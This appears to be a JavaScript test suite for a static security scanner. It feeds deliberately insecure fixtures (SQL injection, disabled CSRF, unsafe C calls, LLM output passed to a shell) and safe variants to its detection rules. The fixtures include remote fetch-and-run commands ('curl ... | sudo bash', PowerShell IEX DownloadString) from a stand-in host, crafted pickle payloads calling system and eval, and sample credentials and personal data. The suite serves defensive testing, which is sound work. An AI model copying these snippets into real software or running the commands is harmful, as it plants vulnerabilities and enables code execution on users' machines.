    const AdmZip = require('adm-zip');
    const { runStaticModules } = require('../src/core/modules/static');
    const { classify } = require('../src/core/taxonomy');
    const i18n = require('../src/core/findings-i18n');
    const collected = [];
    const run = (us) => { const r = runStaticModules(us); collected.push(...r.findings); return r.findings; };
    const has = (fs2, id, file) => fs2.some((f) => f.ruleId === id && (!file || f.location.startsWith(file)));

    // Frameworks
    const fw = run([
      { label: 'web/app/actions.ts', content: `'use server'\nimport { db } from './db';\nexport async function deletePost(id: string) {\n  await db.post.delete({ where: { id } });\n}\n` },
      { label: 'web/app/safe-actions.ts', content: `'use server'\nexport async function deletePost(id) {\n  const session = await auth();\n  if (!session) throw new Error('no');\n  await db.post.delete({ where: { id } });\n}\n` },
      { label: 'web/.env.production', content: 'NEXT_PUBLIC_STRIPE_SECRET=abc\nAPP_DEBUG=true\n' },
      { label: 'web/.env.local', content: 'APP_DEBUG=true\n' },
      { label: 'web/nuxt.config.ts', content: 'export default defineNuxtConfig({ runtimeConfig: { apiSecret: "", public: { stripeSecret: "x" } } })' },
      { label: 'web/Comp.vue', content: '<div v-html="post.body"></div>' },
      { label: 'web/app/Models/User.php', content: '<?php class User extends Model { protected $guarded = []; }\nUser::create($request->all());' },
      { label: 'web/app/Http/Middleware/VerifyCsrfToken.php', content: "<?php protected $except = ['api/*'];" },
      { label: 'web/resources/views/p.blade.php', content: '<div>{!! $post->body !!}</div> {!! $slot !!}' },
      { label: 'web/app/Repo.php', content: '<?php DB::select("SELECT * FROM u WHERE id = $id"); $q->whereRaw("price > ?", [$p]);' },
      { label: 'svc/SecurityConfig.java', content: 'http.csrf(AbstractHttpConfigurer::disable).authorizeHttpRequests(a -> a.anyRequest().permitAll());' },
      { label: 'svc/ApiConfig.java', content: 'http.csrf(c -> c.disable()).sessionManagement(s -> s.sessionCreationPolicy(SessionCreationPolicy.STATELESS));' },
      { label: 'svc/src/main/resources/application.properties', content: 'management.endpoints.web.exposure.include=*\nspring.h2.console.enabled=true\nserver.error.include-stacktrace=always\n' },
      { label: 'dj/proj/settings.py', content: "DEBUG = True\nALLOWED_HOSTS = ['*']\nSESSION_COOKIE_SECURE = False\n" },
      { label: 'dj/proj/settings_dev.py', content: 'DEBUG = True\n' },
      { label: 'dj/app/views.py', content: "@csrf_exempt\ndef hook(request):\n    User.objects.raw(f\"SELECT * FROM u WHERE n = '{request.GET['n']}'\")\n    return mark_safe(f'<b>{name}</b>')\nclass F(ModelForm):\n    class Meta:\n        fields = '__all__'\n" },
      { label: 'dj/app/safe.py', content: 'User.objects.raw("SELECT * FROM u WHERE id = %s", [uid])\nformat_html("<b>{}</b>", name)\n' },
      { label: 'rb/app/controllers/users_controller.rb', content: 'skip_before_action :verify_authenticity_token\nUser.where("name = \'#{params[:n]}\'")\nUser.new(params.permit!)\nsend_file params[:path]\nparams[:type].constantize\n' },
      { label: 'rb/config/environments/production.rb', content: 'config.consider_all_requests_local = true\nconfig.force_ssl = false\n' },
      { label: 'net/web.config', content: '<system.web><customErrors mode="Off"/><compilation debug="true"/><pages validateRequest="false"/></system.web>' },
      { label: 'net/Startup.cs', content: '[IgnoreAntiforgeryToken]\npublic class C {}\napp.UseDeveloperExceptionPage();\npolicy.AllowAnyOrigin();\nawait TryUpdateModelAsync(user);' },
      { label: 'net/Program.cs', content: 'if (env.IsDevelopment()) { app.UseDeveloperExceptionPage(); }' },
    ]);
    check('fw: Next.js Server Action ohne Anmeldung erkannt, mit auth() nicht', has(fw, 'next-server-action-no-auth', 'web/app/actions.ts') && !has(fw, 'next-server-action-no-auth', 'web/app/safe-actions.ts'));
    check('fw: NEXT_PUBLIC_-Geheimnis und Nuxt public secret', has(fw, 'next-public-secret') && has(fw, 'nuxt-public-secret') && has(fw, 'nuxt-xss-v-html'));
    check('fw: Laravel Debug, Mass Assignment, CSRF-Ausnahme, Blade, Raw-SQL', ['laravel-debug-on', 'laravel-mass-assignment', 'laravel-mass-assignment-request', 'laravel-csrf-except', 'laravel-xss-blade-unescaped', 'laravel-raw-sql'].every((id) => has(fw, id)));
    check('fw: Laravel .env.local und {!! $slot !!} bleiben ruhig', !has(fw, 'laravel-debug-on', 'web/.env.local') && fw.filter((f) => f.ruleId === 'laravel-xss-blade-unescaped').length === 1 && fw.filter((f) => f.ruleId === 'laravel-raw-sql').length === 1);
    check('fw: Spring CSRF aus, permitAll, Actuator, H2, Stacktrace', ['spring-csrf-disabled', 'spring-permit-all', 'spring-actuator-exposed', 'spring-h2-console', 'spring-error-stacktrace'].every((id) => has(fw, id)) && !has(fw, 'spring-csrf-disabled', 'svc/ApiConfig.java'));
    check('fw: Django Debug, Hosts, Cookie, csrf_exempt, raw, mark_safe, __all__', ['django-debug-on', 'django-allowed-hosts-wildcard', 'django-insecure-cookie', 'django-csrf-exempt', 'django-raw-sql', 'django-xss-mark-safe', 'django-mass-assignment-all-fields'].every((id) => has(fw, id)));
    check('fw: Django settings_dev und parametrisierte raw() bleiben ruhig', !has(fw, 'django-debug-on', 'dj/proj/settings_dev.py') && !fw.some((f) => f.location.startsWith('dj/app/safe.py')));
    check('fw: Rails CSRF, SQL, permit!, send_file, constantize, Produktion', ['rails-csrf-skipped', 'rails-sql-interp', 'rails-mass-assignment', 'rails-path-send-file', 'rails-constantize-params', 'rails-debug-on', 'rails-no-https'].every((id) => has(fw, id)));
    check('fw: ASP.NET customErrors, debug, validateRequest, Antiforgery, CORS, TryUpdateModel', ['aspnet-custom-errors-off', 'aspnet-debug-on', 'aspnet-xss-request-validation-off', 'aspnet-csrf-ignored', 'aspnet-dev-exception-page', 'aspnet-cors-any-origin', 'aspnet-mass-assignment'].every((id) => has(fw, id)) && !has(fw, 'aspnet-dev-exception-page', 'net/Program.cs'));
    check('fw: CSRF → CWE-352, Server Action → CWE-862', classify({ ruleId: 'django-csrf-exempt' }).cwe === 'CWE-352' && classify({ ruleId: 'next-server-action-no-auth' }).cwe === 'CWE-862');

    // C/C++ und weitere Sprachen
    const lg = run([
      { label: 'c/main.c', content: 'char b[8];\ngets(b);\nstrcpy(b, argv[1]);\nsprintf(b, "%s", s);\nprintf(user);\nfprintf(stderr, msg);\nmemcpy(dst, src, n);\nscanf("%s", b);\nsystem(cmd);\n' },
      { label: 'c/safe.c', content: 'fgets(b, sizeof b, stdin);\nsnprintf(b, sizeof b, "%s", s);\nprintf("%s", user);\nif (n > sizeof dst) return;\nmemcpy(dst, src, n);\nmemcpy(dst, src, sizeof dst);\nscanf("%7s", b);\nsystem("ls");\n' },
      { label: 'r/app.rb', content: 'system("convert #{params[:f]}")\neval(params[:code])\nYAML.unsafe_load(body)\nMarshal.load(cookies[:x])\nopen(params[:url])\nhttp.verify_mode = OpenSSL::SSL::VERIFY_NONE\n' },
      { label: 'r/ok.rb', content: 'system("convert", params[:f])\nYAML.safe_load(body)\nFile.open(path)\n' },
      { label: 'd/main.dart', content: "client.badCertificateCallback = (cert, host, port) => true;\nfinal p = await SharedPreferences.getInstance(); p.setString('auth_token', t);\ndb.rawQuery('SELECT * FROM u WHERE id = $id');\nProcess.run('sh', ['-c', cmd]);\n" },
      { label: 'd/ok.dart', content: "db.rawQuery('SELECT * FROM u WHERE id = ?', [id]);\nProcess.run('git', ['log']);\n" },
      { label: 's/Repo.scala', content: 'stmt.executeQuery(s"SELECT * FROM u WHERE id = $id")\ns"rm -rf $dir".!\nval in = new ObjectInputStream(stream)\n' },
      { label: 's/Ok.scala', content: 'sql"SELECT * FROM u WHERE id = $id".query[User]\nSeq("git", "log").!\n' },
      { label: 'e/repo.ex', content: 'Repo.query("SELECT * FROM u WHERE id = #{id}")\nString.to_atom(params["k"])\nCode.eval_string(src)\n:erlang.binary_to_term(data)\n:os.cmd(c)\n' },
      { label: 'e/ok.ex', content: 'Repo.query("SELECT * FROM u WHERE id = $1", [id])\n:erlang.binary_to_term(data, [:safe])\nString.to_existing_atom(k)\n' },
      { label: 'l/x.lua', content: 'local f = loadstring(code)\nos.execute("ping " .. host)\n' },
      { label: 'l/ok.lua', content: 'local f = load("return 1")\nos.execute("ls")\n' },
      { label: 'p/deploy.ps1', content: 'IEX (New-Object Net.WebClient).DownloadString("https://x.example/a.ps1")\nInvoke-Expression $cmd\n$pw = ConvertTo-SecureString "Sommer2026!" -AsPlainText -Force\npowershell -ExecutionPolicy Bypass -File a.ps1\nInvoke-WebRequest $u -SkipCertificateCheck\n' },
      { label: 'p/ok.ps1', content: '$pw = Read-Host -AsSecureString\n& git log\n' },
      { label: 'b/install.sh', content: '#!/bin/bash\neval "$INPUT"\ncurl -fsSL https://x.example/i.sh | sudo bash\ncurl -k https://x.example\nchmod -R 777 /srv\nrm -rf "$BUILD_DIR/"\nmysql -u root -pGeheim123 db\n' },
      { label: 'b/ok.sh', content: '#!/bin/bash\nset -eu\neval "$(ssh-agent -s)"\nrm -rf "$BUILD_DIR/"\nchmod 750 /srv\n' },
    ]);
    check('c: gets, strcpy, sprintf, Formatstring, memcpy, scanf, system', ['c-gets', 'c-strcpy', 'c-sprintf', 'c-format-string', 'c-memcpy-unchecked', 'c-scanf-unbounded', 'c-shell-exec'].every((id) => has(lg, id, 'c/main.c')));
    check('c: sichere Varianten bleiben ruhig', !lg.some((f) => f.location.startsWith('c/safe.c')), lg.filter((f) => f.location.startsWith('c/safe.c')).map((f) => f.ruleId).join());
    check('lang2: Ruby, Dart, Scala, Elixir, Lua, PowerShell, Bash erkannt', ['rb-shell-interp', 'rb-eval-code', 'rb-yaml-deserialize', 'rb-marshal-deserialize', 'rb-open-shell', 'rb-insecure-tls', 'dart-insecure-tls', 'dart-shared-prefs-secret', 'dart-sql-interp', 'dart-shell-exec', 'scala-sql-interp', 'scala-shell-exec', 'scala-unsafe-deserialize', 'ex-sql-interp', 'ex-atom-dos', 'ex-code-eval', 'ex-unsafe-deserialize', 'ex-shell-cmd', 'lua-eval-code', 'lua-shell-exec', 'ps-download-exec', 'ps-invoke-expression', 'ps-plaintext-password', 'ps-execution-policy-bypass', 'ps-insecure-tls', 'sh-eval-code', 'sh-curl-pipe', 'sh-insecure-tls', 'sh-chmod-777', 'sh-rm-unguarded', 'sh-password-cli'].every((id) => has(lg, id)), ['rb-shell-interp', 'sh-password-cli'].filter((id) => !has(lg, id)).join());
    check('lang2: sichere Varianten bleiben ruhig', !lg.some((f) => /\/ok\.\w+:/.test(f.location)), lg.filter((f) => /\/ok\.\w+:/.test(f.location)).map((f) => f.ruleId).join());
    check('lang2: Passwörter in Fundstellen maskiert', lg.filter((f) => /password/.test(f.ruleId)).every((f) => !/Sommer2026|Geheim123/.test(f.evidence || '') && /REDACTED/.test(f.evidence)));
    const { TEXT_EXT } = require('../src/core/ingest');
    check('ingest: neue Endungen werden gelesen', ['.dart', '.ex', '.exs', '.lua', '.ps1', '.sh', '.rb', '.scala', '.cpp', '.hh', '.ipynb'].every((e) => TEXT_EXT.has(e)));

    // SQL-Rechte
    const sq = run([
      { label: 'db/init.sql', content: "CREATE USER 'app'@'%' IDENTIFIED BY 'changeme';\nGRANT ALL PRIVILEGES ON shop.* TO 'app'@'%';\nGRANT SELECT ON ALL TABLES IN SCHEMA public TO PUBLIC;\nCREATE ROLE admin WITH LOGIN SUPERUSER PASSWORD 'Xy7!kq2Lmn';\n" },
      { label: 'db/migrations/002_users.sql', content: "CREATE ROLE reader WITH LOGIN NOSUPERUSER PASSWORD '${READER_PW}';\nGRANT SELECT ON orders TO reader;\n" },
    ]);
    check('sql: GRANT ALL, PUBLIC, jeder Host, Standard-Passwort, Superuser', ['sql-grant-all', 'sql-grant-public', 'sql-grant-any-host', 'sql-default-password', 'sql-superuser-role', 'sql-plaintext-password'].every((id) => has(sq, id)));
    check('sql: gezielte Rechte und Platzhalter-Passwort bleiben ruhig', !sq.some((f) => f.location.startsWith('db/migrations/')) && sq.every((f) => !/changeme|Xy7!kq2Lmn/.test(f.evidence || '')));
    check('sql: GRANT → CWE-269, nicht SQL-Injection', classify({ ruleId: 'sql-grant-all' }).cwe === 'CWE-269');

    // OpenAPI und GraphQL
    const spec = `openapi: 3.0.3\ninfo:\n  title: Shop\nservers:\n  - url: http://api.shop.example.com\ncomponents:\n  securitySchemes:\n    key:\n      type: apiKey\n      in: query\n      name: api_key\npaths:\n  /orders:\n    get:\n      parameters:\n        - name: access_token\n          in: query\n          schema:\n            type: string\n        - name: q\n          in: query\n          schema:\n            type: string\n    post:\n      requestBody:\n        content:\n          application/json:\n            schema:\n              type: object\n              properties:\n                note:\n                  type: string\n                items:\n                  type: array\n                  items:\n                    type: string\n`;
    const okSpec = `{"openapi":"3.1.0","security":[{"bearer":[]}],"components":{"securitySchemes":{"bearer":{"type":"http","scheme":"bearer"}}},"servers":[{"url":"https://api.example.com"}],"paths":{"/a":{"get":{"parameters":[{"name":"q","in":"query","schema":{"type":"string","maxLength":50}}]}}}}`;
    const ap = run([
      { label: 'api/openapi.yaml', content: spec },
      { label: 'api/ok.json', content: okSpec },
      { label: 'gql/server.js', content: 'const server = new ApolloServer({ typeDefs, resolvers, introspection: true });' },
    ]);
    check('openapi: ungeschützte Operationen, Schlüssel/Token in der URL, Grenzen, HTTP', ['openapi-no-security', 'openapi-apikey-in-query', 'openapi-secret-in-query', 'openapi-no-limits', 'openapi-http-server'].every((id) => has(ap, id, 'api/openapi.yaml')) && ap.find((f) => f.ruleId === 'openapi-no-security').severity === 'high');
    check('openapi: abgesicherte Spezifikation bleibt ruhig', !ap.some((f) => f.location.startsWith('api/ok.json')));
    check('graphql: Introspection an und keine Tiefengrenze', has(ap, 'graphql-introspection-on') && has(ap, 'graphql-no-depth-limit'));
    const ap2 = run([{ label: 'gql/server.js', content: "import depthLimit from 'graphql-depth-limit';\nconst server = new ApolloServer({ typeDefs, introspection: process.env.NODE_ENV !== 'production', validationRules: [depthLimit(8)] });" }]);
    check('graphql: mit depthLimit und bedingter Introspection ruhig', !ap2.length);

    // Krypto-Inventar
    const cr = run([
      { label: 'k/keys.js', content: "crypto.generateKeyPairSync('rsa', { modulusLength: 1024 });\nconst c = crypto.createCipheriv('aes-256-gcm', k, iv);\nconst h = crypto.createHash('md5');\nconst s = crypto.createHash('sha256');\n" },
      { label: 'k/sign.py', content: 'from cryptography.hazmat.primitives.asymmetric import ec\nkey = ec.generate_private_key(ec.SECP384R1())  # ECDSA P-384\n' },
    ]);
    const inv = cr.find((f) => f.ruleId === 'crypto-inventory');
    check('krypto: ein Info-Befund mit Verfahren', inv && inv.severity === 'info' && /RSA/.test(inv.description) && /AES-GCM/.test(inv.description) && cr.filter((f) => f.ruleId === 'crypto-inventory').length === 1);
    check('krypto: nicht quantensicher notiert, schwache Verfahren und kurze Schlüssel höher', has(cr, 'crypto-not-pq-ready') && cr.find((f) => f.ruleId === 'crypto-weak-algorithm').severity === 'medium' && cr.find((f) => f.ruleId === 'crypto-weak-key-size').severity === 'high');
    const cr2 = run([{ label: 'k/pq.go', content: 'kem := mlkem.GenerateKey768()\nx := ecdh.X25519()\nh := sha256.Sum256(b)\nrsa.GenerateKey(rand.Reader, 3072)\n' }]);
    check('krypto: mit ML-KEM kein PQ-Hinweis, 3072 Bit nicht zu kurz', has(cr2, 'crypto-inventory') && !has(cr2, 'crypto-not-pq-ready') && !has(cr2, 'crypto-weak-key-size') && !has(cr2, 'crypto-weak-algorithm'));

    // LLM vertieft
    const ll = run([
      { label: 'ai/agent.py', content: 'from langchain_community.tools import ShellTool\nfrom openai import OpenAI\nresp = client.chat.completions.create(model="x", messages=[{"role": "system", "content": f"Du hilfst {user_input}"}])\nsql = resp.choices[0].message.content\ncursor.execute(sql)\nexec(resp.choices[0].message.content)\nos.system(sql)\n' },
      { label: 'ai/tools.ts', content: "import OpenAI from 'openai';\nimport { execSync } from 'child_process';\nconst tools = [{ type: 'function', function: { name: 'run_shell', parameters: {} } }];\nconst r = await openai.chat.completions.create({ tools });\nconst out = r.choices[0].message.content;\nexecSync(out);\n" },
      { label: 'ai/safe.ts', content: "import OpenAI from 'openai';\nconst r = await openai.chat.completions.create({ messages: [{ role: 'system', content: 'Fest' }, { role: 'user', content: input }] });\nconsole.info(r.choices[0].message.content.length);\n" },
    ]);
    check('llm: Werkzeuge mit Shell-Zugriff (LangChain und eigene Tools)', has(ll, 'llm-tool-excessive-agency', 'ai/agent.py') && has(ll, 'llm-tool-excessive-agency', 'ai/tools.ts'));
    check('llm: KI-Ausgabe in SQL, eval und Shell', has(ll, 'llm-output-to-sql', 'ai/agent.py') && has(ll, 'llm-output-to-eval', 'ai/agent.py') && has(ll, 'llm-output-to-shell', 'ai/agent.py') && has(ll, 'llm-output-to-shell', 'ai/tools.ts'));
    check('llm: Eingabe im System-Prompt (Python f-String)', has(ll, 'llm-prompt-injection-concat', 'ai/agent.py'));
    check('llm: saubere Nutzung bleibt ruhig', !ll.some((f) => f.location.startsWith('ai/safe.ts')));

    // MCP-Konfigurationen
    const mc = run([
      { label: 'proj/.mcp.json', content: JSON.stringify({ mcpServers: { github: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-github'], env: { GITHUB_PERSONAL_ACCESS_TOKEN: 'ghp_' + 'a1B2c3D4e5F6g7H8i9J0k1L2m3N4o5P6q7R8' } }, fs: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystem@2025.1.14', 'C:\\Users\\pat'] }, remote: { url: 'http://mcp.example.com/sse' } } }, null, 2) },
      { label: 'proj/.cursor/mcp.json', content: JSON.stringify({ mcpServers: { github: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-github@1.2.3'], env: { GITHUB_PERSONAL_ACCESS_TOKEN: '${env:GITHUB_TOKEN}' } }, fs: { command: 'npx', args: ['@modelcontextprotocol/server-filesystem@1.0.0', 'C:\\Users\\pat\\Projekte\\app'] }, py: { command: 'uvx', args: ['mcp-server-fetch==2025.1.17'] } } }, null, 2) },
    ]);
    check('mcp: Klartext-Token, ungepinntes npx -y, zu weiter Ordner, HTTP', ['mcp-plaintext-token', 'mcp-unpinned-package', 'mcp-broad-fs-root', 'mcp-remote-http'].every((id) => has(mc, id, 'proj/.mcp.json')));
    check('mcp: Platzhalter, feste Versionen und Projektordner bleiben ruhig', !mc.some((f) => f.location.startsWith('proj/.cursor/')));
    check('mcp: Token in der Fundstelle maskiert', mc.filter((f) => f.ruleId === 'mcp-plaintext-token').every((f) => /REDACTED/.test(f.evidence) && !/a1B2c3D4e5F6g7H8i9J0/.test(f.evidence)));

    // Personenbezogene Daten, Logs, Notebooks
    const { ibanValid, steuerIdValid, ausweisValid } = require('../src/core/modules/privacy');
    check('pii: IBAN-Prüfsumme', ibanValid('DE44 5001 0517 5407 3249 31') && !ibanValid('DE44 5001 0517 5407 3249 32'));
    check('pii: Steuer-ID und Ausweisnummer mit Prüfziffer', steuerIdValid('86095742719') && !steuerIdValid('86095742718') && ausweisValid('T220001293') && !ausweisValid('T220001294'));
    const pv = run([
      { label: 'shop/test/fixtures/customers.json', content: JSON.stringify([{ name: 'A', mail: 'anna.schmidt@gmx.de', iban: 'DE44 5001 0517 5407 3249 31', tel: '+49 170 1234567' }, { mail: 'b.meier@web.de', tel: '+49 30 98765432' }, { mail: 'c.k@t-online.de' }, { mail: 'd.x@posteo.de' }, { mail: 'e.y@mailbox.org' }, { steuer_id: '86095742719' }]) },
      { label: 'shop/test/fixtures/fake.json', content: JSON.stringify([{ mail: 'a@example.com', iban: 'DE89370400440532013000' }, { mail: 'b@example.com' }, { tel: '+49 30 1234567' }]) },
      { label: 'shop/src/auth.js', content: "console.log('login', user.email, password);\nlogger.info(`token=${token}`);\napp.use((req, res, next) => { console.log(req.headers); next(); });\n" },
      { label: 'shop/src/ok.js', content: "console.log('Password changed for', user.id);\nlogger.info('token expired');\nconsole.log(token.length);\n" },
      { label: 'nb/analyse.ipynb', content: JSON.stringify({ cells: [{ cell_type: 'code', source: ['print(os.environ)'], outputs: [{ output_type: 'stream', text: ["{'OPENAI_API_KEY': 'sk-" + 'abcdefghijklmnopqrstuvwx1234' + "'}\n"] }] }, { cell_type: 'code', source: ['df.head()'], outputs: [{ output_type: 'execute_result', data: { 'text/plain': ['   name   email\n0  Anna  anna.schmidt@gmx.de\n1  Ben  b.meier@web.de\n2  Cem  c.k@t-online.de\n'] } }] }], metadata: {}, nbformat: 4 }) },
      { label: 'nb/clean.ipynb', content: JSON.stringify({ cells: [{ cell_type: 'code', source: ['1+1'], outputs: [{ output_type: 'execute_result', data: { 'text/plain': ['2'] } }] }], nbformat: 4 }) },
    ]);
    check('pii: IBAN, E-Mail-Liste, Telefon, Steuer-ID in Testdaten', ['pii-iban', 'pii-email-list', 'pii-phone-list', 'pii-german-id'].every((id) => has(pv, id, 'shop/test/fixtures/customers.json')));
    check('pii: Beispiel-IBAN und @example.com bleiben ruhig', !pv.some((f) => f.location.startsWith('shop/test/fixtures/fake.json')));
    check('pii: Werte maskiert', pv.filter((f) => /^pii-/.test(f.ruleId)).every((f) => !/5407 ?3249|anna\.schmidt|86095742719/.test(f.evidence || '')));
    check('logs: Passwort/Token und ganze Header im Log erkannt', has(pv, 'log-sensitive-data', 'shop/src/auth.js') && has(pv, 'log-full-request', 'shop/src/auth.js') && pv.filter((f) => f.location.startsWith('shop/src/auth.js')).length === 3);
    check('logs: Texte und .length bleiben ruhig', !pv.some((f) => f.location.startsWith('shop/src/ok.js')));
    check('notebook: Schlüssel und personenbezogene Daten in Ausgaben', has(pv, 'notebook-output-secret', 'nb/analyse.ipynb') && has(pv, 'notebook-output-pii', 'nb/analyse.ipynb') && pv.filter((f) => f.ruleId === 'notebook-output-secret').every((f) => !/abcdefghijklmnop/.test(f.evidence)));
    check('notebook: Notebook ohne Daten bleibt ruhig', !pv.some((f) => f.location.startsWith('nb/clean.ipynb')));

    // Webserver-Konfiguration
    const sv = run([
      { label: 'ops/nginx.conf', content: 'http {\n  server {\n    listen 443 ssl;\n    ssl_certificate /etc/x.pem;\n    ssl_protocols TLSv1 TLSv1.1 TLSv1.2;\n    ssl_ciphers HIGH:!aNULL:RC4-SHA;\n    location / { autoindex on; }\n  }\n}\n' },
      { label: 'ops/good-nginx.conf', content: 'http {\n  server_tokens off;\n  server {\n    listen 443 ssl;\n    ssl_certificate /etc/x.pem;\n    ssl_protocols TLSv1.2 TLSv1.3;\n    ssl_ciphers HIGH:!aNULL:!MD5:!RC4;\n    add_header Strict-Transport-Security "max-age=31536000" always;\n    add_header X-Content-Type-Options nosniff;\n    add_header Content-Security-Policy "default-src \'self\'";\n    add_header X-Frame-Options DENY;\n  }\n}\n' },
      { label: 'ops/apache/site.conf', content: '<VirtualHost *:443>\n  SSLEngine on\n  SSLProtocol all -SSLv3\n  Options Indexes FollowSymLinks\n  ServerTokens Full\n  TraceEnable On\n</VirtualHost>\n' },
      { label: 'ops/apache/good.conf', content: '<VirtualHost *:443>\n  SSLEngine on\n  SSLProtocol -all +TLSv1.2 +TLSv1.3\n  Options -Indexes\n  ServerTokens Prod\n  Header always set Strict-Transport-Security "max-age=31536000"\n  Header always set X-Content-Type-Options nosniff\n  Header always set Content-Security-Policy "default-src \'self\'"\n  Header always set X-Frame-Options DENY\n</VirtualHost>\n' },
      { label: 'ops/Caddyfile', content: 'example.com {\n  tls {\n    protocols tls1.0\n  }\n  file_server browse\n}\n' },
    ]);
    check('srvconf: nginx alte TLS, schwache Chiffre, autoindex, server_tokens, Header', ['nginx-old-tls', 'nginx-weak-ciphers', 'nginx-autoindex', 'nginx-server-tokens', 'nginx-missing-headers'].every((id) => has(sv, id, 'ops/nginx.conf')));
    check('srvconf: Apache und Caddy', ['apache-old-tls', 'apache-dir-listing', 'apache-server-tokens', 'apache-trace-enabled', 'apache-missing-headers'].every((id) => has(sv, id, 'ops/apache/site.conf')) && has(sv, 'caddy-old-tls') && has(sv, 'caddy-dir-listing'));
    check('srvconf: gehärtete Konfigurationen bleiben ruhig', !sv.some((f) => /good/.test(f.location)), sv.filter((f) => /good/.test(f.location)).map((f) => f.ruleId).join());

    // Code-Qualitaet
    const longFn = 'function huge(a) {\n' + Array.from({ length: 160 }, (_, i) => `  const v${i} = a + ${i};`).join('\n') + '\n  return a;\n}\n';
    const branchy = 'function decide(x) {\n' + Array.from({ length: 32 }, (_, i) => `  if (x === ${i} && x > 0) return ${i};`).join('\n') + '\n}\n';
    const block = Array.from({ length: 12 }, (_, i) => `  total = total + items[${i}].price * items[${i}].quantity * rate;`).join('\n');
    const qa = run([
      { label: 'q/big.js', content: longFn + branchy },
      { label: 'q/a.js', content: `function a(items, rate) {\n  let total = 0;\n${block}\n  return total;\n}\n` },
      { label: 'q/b.js', content: `function b(items, rate) {\n  let total = 0;\n${block}\n  return total;\n}\n` },
      { label: 'q/small.py', content: 'def f(x):\n    return x + 1\n' },
    ]);
    check('quality: lange und verzweigte Funktion (niedrig)', has(qa, 'quality-long-function', 'q/big.js') && has(qa, 'quality-complex-function', 'q/big.js') && qa.filter((f) => /long|complex/.test(f.ruleId)).every((f) => f.severity === 'low'));
    check('quality: kopierter Block als Hinweis', has(qa, 'quality-duplicate-block', 'q/b.js') && qa.find((f) => f.ruleId === 'quality-duplicate-block').severity === 'info' && !qa.some((f) => f.location.startsWith('q/small.py')));

    // Regeldateien (rules/*.yml)
    const { loadRuleFiles } = require('../src/core/rulefiles');
    const { PATTERN_RULES, prescan: pscan } = require('../src/core/prescan');
    const OLD = [['XSS', 'Rails: html_safe', /\.html_safe\b/g, 'medium'], ['Injection', 'Rails: SQL-Interpolation in where', /\.where\s*\(\s*["'][^"']*#\{/g, 'high'], ['AccessControl', 'Rails: CSRF-Schutz uebersprungen', /skip_before_action\s*:verify_authenticity_token/g, 'high'], ['AccessControl', 'Rails: Mass Assignment (permit!)', /\.permit!/g, 'medium'], ['XSS', 'Django: mark_safe', /mark_safe\s*\(/g, 'medium'], ['Injection', 'Django: raw/extra SQL', /\.(?:raw|extra)\s*\(/g, 'medium'], ['AccessControl', 'Django: csrf_exempt', /csrf_exempt/g, 'high'], ['Config', 'Django: ALLOWED_HOSTS Wildcard', /ALLOWED_HOSTS\s*=\s*\[\s*["']\*["']/g, 'medium']];
    check('regeldateien: migrierte Rails-/Django-Regeln identisch', OLD.every(([cat, name, re, sev]) => PATTERN_RULES.some((r) => r.name === name && r.cat === cat && r.sev === sev && r.re.source === re.source && r.re.flags === re.flags)) && PATTERN_RULES.filter((r) => /^(Rails|Django):/.test(r.name)).length === 8);
    const ps = pscan([{ label: 'x.rb', content: 'skip_before_action :verify_authenticity_token\nUser.where("a = #{b}")' }]);
    check('regeldateien: Muster landen weiter in den KI-Fakten', /Rails: CSRF-Schutz uebersprungen/.test(ps.facts) && /Rails: SQL-Interpolation in where/.test(ps.facts));
    const tmpRules = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-rules-'));
    fs.writeFileSync(path.join(tmpRules, 'eigen.yaml'), "rules:\n  - name: Interner Debug-Schalter\n    category: Config\n    severity: low\n    regex: 'FEATURE_DEBUG\\s*=\\s*1'\n    kind: finding\n  - name: Kaputt\n    severity: extrem\n    regex: 'x'\n  - name: Klammer\n    regex: '(('\n");
    fs.writeFileSync(path.join(tmpRules, 'more.json'), JSON.stringify({ rules: [{ name: 'JSON-Regel', category: 'XSS', severity: 'medium', regex: 'v-html', flags: 'i' }] }));
    const lr = loadRuleFiles([tmpRules]);
    check('regeldateien: YAML/JSON geladen, ungültige Regeln abgewiesen', lr.findings.length === 1 && lr.patterns.length === 1 && lr.patterns[0].re.flags === 'gi' && lr.errors.length === 2);
    fs.rmSync(tmpRules, { recursive: true, force: true });

    // Modelldateien (Pickle) – nur lesen, nie laden
    const { analyzeModelFile, scanPickle } = require('../src/core/modelscan');
    const evil2 = Buffer.concat([Buffer.from([0x80, 0x02]), Buffer.from('cposix\nsystem\nq\x00X', 'latin1'), Buffer.from([7, 0, 0, 0]), Buffer.from('echo hi'), Buffer.from([0x71, 0x01, 0x85, 0x71, 0x02, 0x52, 0x71, 0x03, 0x2e])]);
    const s4 = (t) => Buffer.concat([Buffer.from([0x8c, t.length]), Buffer.from(t), Buffer.from([0x94])]);
    const evil4 = Buffer.concat([Buffer.from([0x80, 0x04]), s4('builtins'), s4('eval'), Buffer.from([0x93, 0x94]), s4('1+1'), Buffer.from([0x85, 0x94, 0x52, 0x94, 0x2e])]);
    const safe = Buffer.concat([Buffer.from([0x80, 0x02]), Buffer.from('ccollections\nOrderedDict\nq\x00)Rq\x01.', 'latin1')]);
    check('modell: GLOBAL os/posix.system + REDUCE kritisch', (() => { const f = analyzeModelFile(evil2, 'm/model.pkl'); return f.length === 1 && f[0].severity === 'critical' && /posix\.system/.test(f[0].title); })());
    check('modell: STACK_GLOBAL builtins.eval (Protokoll 4)', analyzeModelFile(evil4, 'm/x.joblib').some((f) => /builtins\.eval/.test(f.title)));
    check('modell: harmloses Pickle bleibt ruhig, Opcodes werden gelesen', !analyzeModelFile(safe, 'm/ok.pkl').length && scanPickle(safe).ok && scanPickle(safe).globals[0].mod === 'collections');
    check('modell: zweites Pickle nach dem ersten (alte torch-Dateien)', analyzeModelFile(Buffer.concat([safe, evil2, Buffer.from([1, 2, 3, 0xff])]), 'm/legacy.pt').length === 1);
    const tmpM = fs.mkdtempSync(path.join(os.tmpdir(), 'vigil-model-'));
    const zip = new AdmZip(); zip.addFile('archive/data.pkl', evil4); zip.addFile('archive/data/0', Buffer.alloc(64)); zip.writeZip(path.join(tmpM, 'model.pt'));
    fs.writeFileSync(path.join(tmpM, 'weights.pkl'), safe);
    const { ingestTargets: ingT } = require('../src/core/ingest');
    const ingM = await ingT([{ type: 'path', value: tmpM }]);
    const mf = ingM.findings.filter((f) => f.ruleId === 'model-pickle-dangerous-global');
